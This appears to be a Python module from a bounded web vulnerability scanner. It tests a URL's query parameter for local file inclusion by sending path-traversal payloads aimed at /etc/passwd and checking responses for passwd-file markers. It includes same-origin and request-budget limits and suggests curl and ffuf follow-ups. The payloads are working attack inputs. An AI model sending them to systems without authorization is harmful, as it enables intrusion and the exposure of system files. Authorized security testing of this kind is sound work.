"""LFI/traversal indicators (Phase 9, Task 15). GET-only, same-origin, bounded."""
from __future__ import annotations

import urllib.parse
from typing import Any

from ..session import WebSession
from .. import differential as diff

PAYLOADS = ["../etc/passwd", "../../etc/passwd", "..%2F..%2Fetc%2Fpasswd"]
MARKERS = ["root:x:0:0", "root:/root", "/bin/bash", "daemon:x:"]


def _target_param(url: str) -> str | None:
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        return None
    for cand in ("file", "path", "page", "include", "template", "name"):
        for k, _ in qs:
            if k.lower() == cand:
                return k
    return qs[0][0]


def _replace(url: str, key: str, value: str) -> str:
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    nq = [(k, value if k == key else v) for k, v in q]
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path, urllib.parse.urlencode(nq), parts.fragment))


def probe(url: str, session: Any | None = None, max_requests: int = 6) -> list[str]:
    if session is None:
        session = WebSession(base_url=url, max_requests=max_requests)
    if not session.can_fetch(url):
        raise ValueError(f"blocked cross-origin request: {url!r} (base {session.base_url})")
    start = len(session.ledger)

    def _guard():
        if (len(session.ledger) - start) >= max_requests:
            raise RuntimeError(f"request budget exhausted ({max_requests} max for technique)")

    key = _target_param(url)
    if key is None:
        return ["traversal: inconclusive - no query parameter to test (candidate only)."]
    _guard()
    base = diff.fetch_bounded(session, "GET", url)
    base_text = base.body_text or ""
    rows: list[str] = []
    for payload in PAYLOADS[:3]:
        _guard()
        variant = diff.fetch_bounded(session, "GET", _replace(url, key, payload))
        vtext = variant.body_text or ""
        hit = next((m for m in MARKERS if m in vtext and m not in base_text), None)
        cmp = diff.compare(base, variant)
        if hit:
            rows.append(
                f"traversal ?{key}={payload}: deterministic - LFI marker {hit!r} present "
                f"(status {cmp['status_before']}->{cmp['status_after']}, similarity {cmp['similarity']:.2f}). "
                f"handoff: curl {variant.url!r}; confirm locally, do not exfiltrate beyond marker.")
            return rows
        rows.append(
            f"traversal ?{key}={payload}: candidate - no marker "
            f"(status {cmp['status_before']}->{cmp['status_after']}, similarity {cmp['similarity']:.2f}); not proof.")
    rows.append("handoff: manual curl '?file=...' variants; ffuf -u URL -w lfi.txt only if authorized.")
    return rows
